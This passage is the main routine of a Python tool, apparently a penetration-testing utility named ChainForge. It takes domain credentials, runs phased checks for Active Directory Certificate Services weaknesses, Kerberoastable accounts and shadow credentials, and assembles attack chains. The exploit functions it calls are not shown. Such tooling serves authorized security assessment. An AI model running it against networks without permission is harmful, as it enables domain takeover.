    _print(f"\n  {DIM}Full commands with real values are in the Phase output above.{RST}")


# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────

def main():
    global _outfile, _phase_start

    parser = argparse.ArgumentParser(
        description="ChainForge v1.0 — ADCS Attack Triage & Chain Resolution",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("-u", "--user",     required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-d", "--domain",   required=True, help="Domain (e.g. CORP.local)")
    parser.add_argument("--dc-ip",          required=True, help="DC IP address")
    parser.add_argument("--output", "-o",   default=None,  help="Save output to file (ANSI stripped)")
    parser.add_argument("--bloodhound", "-bh", action="store_true",
                        help="Collect BloodHound data for offline graph analysis")
    parser.add_argument("--neo4j", action="store_true",
                        help="Enable Neo4j graph analysis with BH CE defaults "
                             "(bolt://127.0.0.1:7687, neo4j/bloodhoundcommunityedition)")
    parser.add_argument("--neo4j-url",  default=None,
                        help="Neo4j Bolt URL (default: bolt://127.0.0.1:7687)")
    parser.add_argument("--neo4j-user", default="neo4j",
                        help="Neo4j username (default: neo4j)")
    parser.add_argument("--neo4j-pass", default="bloodhoundcommunityedition",
                        help="Neo4j password (default: bloodhoundcommunityedition)")
    args = parser.parse_args()

    # --neo4j flag sets the URL to default if not explicitly provided
    if args.neo4j and not args.neo4j_url:
        args.neo4j_url = "bolt://127.0.0.1:7687"

    # ── Input validation ──
    import ipaddress
    errors = []

    try:
        ipaddress.ip_address(args.dc_ip)
    except ValueError:
        errors.append(f"--dc-ip '{args.dc_ip}' is not a valid IP address")

    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$', args.domain):
        errors.append(f"--domain '{args.domain}' does not look like a valid domain (expected e.g. CORP.local)")

    if not args.user or ' ' in args.user or len(args.user) > 256:
        errors.append(f"--user '{args.user}' is not a valid username")

    if not args.password:
        errors.append("--password cannot be empty")

    if args.output:
        out_dir = os.path.dirname(os.path.abspath(args.output))
        if not os.path.isdir(out_dir):
            errors.append(f"--output directory '{out_dir}' does not exist")

    if errors:
        print(f"\n  {R}[!]{RST} Input validation failed:")
        for e in errors:
            print(f"       {R}✗{RST} {e}")
        print()
        sys.exit(1)

    # Open output file before anything prints so full output is captured
    if args.output:
        try:
            _outfile = open(args.output, 'w')
        except Exception as e:
            print(f"  {R}[!]{RST} Could not open output file: {e}")

    _phase_start = time.time()

    _print(BANNER)
    _print(f"  {DIM}Domain : {args.domain}{RST}")
    _print(f"  {DIM}DC IP  : {args.dc_ip}{RST}")
    _print(f"  {DIM}User   : {args.user}{RST}")
    _print(f"  {DIM}Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RST}")
    if args.output:
        _print(f"  {DIM}Output : {args.output}{RST}")

    # ── Pre-flight: verify all required tools ──
    section("PRE-FLIGHT CHECKS")
    preflight()

    # ── CA detection (runs once, shared across all phases) ──
    section("CA AUTO-DETECTION")
    cas = detect_ca(args.user, args.password, args.domain, args.dc_ip)
    ca = cas[0] if cas else {"name": "UNKNOWN-CA", "dns": args.dc_ip}

    ctx               = phase0_user_context(args.user, args.password, args.domain, args.dc_ip)
    if not ctx["authenticated"]:
        if _outfile:
            _outfile.close()
        sys.exit(1)

    # ── Resolve Administrator SID (used in all attack chain commands) ──
    ctx["admin_sid"] = resolve_admin_sid(args.user, args.password, args.domain, args.dc_ip)

    # ── Optional BloodHound collection + Neo4j import ──
    bh_dir = None
    if args.bloodhound:
        try:
            bh_dir = collect_bloodhound(
                args.user, args.password, args.domain, args.dc_ip,
                neo4j_url=args.neo4j_url,
                neo4j_user=args.neo4j_user,
                neo4j_pass=args.neo4j_pass,
            )
        except Exception as e:
            _print(f"\n  {R}[!]{RST} BloodHound collection error: {e} — continuing")

    # ── Optional Neo4j graph analysis ──
    graph_results = None
    graph_writable_users = []
    graph_writable_computers = []
    if args.neo4j_url:
        try:
            graph_results = phase_graph_analysis(
                args.user, args.domain,
                args.neo4j_url, args.neo4j_user, args.neo4j_pass, ctx
            )
            graph_writable_users, graph_writable_computers = _merge_graph_targets(
                graph_results, ctx
            )
            if graph_writable_users or graph_writable_computers:
                info(f"Graph targets for downstream phases: "
                     f"{len(graph_writable_users)} users, "
                     f"{len(graph_writable_computers)} computers")
        except Exception as e:
            _print(f"\n  {R}[!]{RST} Graph analysis error: {e} — continuing")
            graph_results = None

    # Store graph-discovered targets in ctx for downstream phases
    ctx["graph_writable_users"] = graph_writable_users
    ctx["graph_writable_computers"] = graph_writable_computers
    ctx["graph_results"] = graph_results

    try:
        ca_findings       = phase1_ca_level(args.user, args.password, args.domain, args.dc_ip, ctx, ca)
    except Exception as e:
        ca_findings = []
        _print(f"\n  {R}[!]{RST} Phase 1 error: {e} — continuing")

    try:
        binding, esc10_targets = phase2_binding(args.user, args.password, args.domain, args.dc_ip, ctx, ca)
    except Exception as e:
        binding, esc10_targets = 2, []
        _print(f"\n  {R}[!]{RST} Phase 2 error: {e} — continuing")

    try:
        template_findings = phase3_templates(args.user, args.password, args.domain, args.dc_ip, ctx, ca)
    except Exception as e:
        template_findings = []
        _print(f"\n  {R}[!]{RST} Phase 3 error: {e} — continuing")

    try:
        maq, kerberoast_accounts = phase4_maq(args.user, args.password, args.domain, args.dc_ip, ctx, ca)
    except Exception as e:
        maq, kerberoast_accounts = 0, []
        _print(f"\n  {R}[!]{RST} Phase 4 error: {e} — continuing")

    try:
        subca_enrollable  = phase5_endgame(args.user, args.password, args.domain, args.dc_ip, ctx, ca)
        subca_enrollable  = subca_enrollable or False
    except Exception as e:
        subca_enrollable = False
        _print(f"\n  {R}[!]{RST} Phase 5 error: {e} — continuing")

    try:
        shadow_hits       = phase6_shadow_credentials(args.user, args.password, args.domain, args.dc_ip, ctx, ca)
    except Exception as e:
        shadow_hits = []
        _print(f"\n  {R}[!]{RST} Phase 6 error: {e} — continuing")
    chains            = resolve_chains(args.user, args.password, args.domain, args.dc_ip, ca,
                                       binding, esc10_targets, shadow_hits)
    display_chains(chains)
    print_summary(args.user, ctx, ca_findings, template_findings, maq, binding,
                  shadow_hits, esc10_targets, chains, subca_enrollable,
                  kerberoast_accounts, graph_results)

    # ── Timing ──
    elapsed = time.time() - _phase_start
    _print(f"\n  {DIM}Completed in {elapsed:.1f}s{RST}")

    if bh_dir:
        _print(f"  {DIM}BloodHound data: {bh_dir}/{RST}")
    if args.output:
        _print(f"  {DIM}Results saved to {args.output}{RST}")
    _print(f"\n{DIM}{'─'*62}{RST}\n")
    if _outfile:
        _outfile.close()


if __name__ == "__main__":
    main()
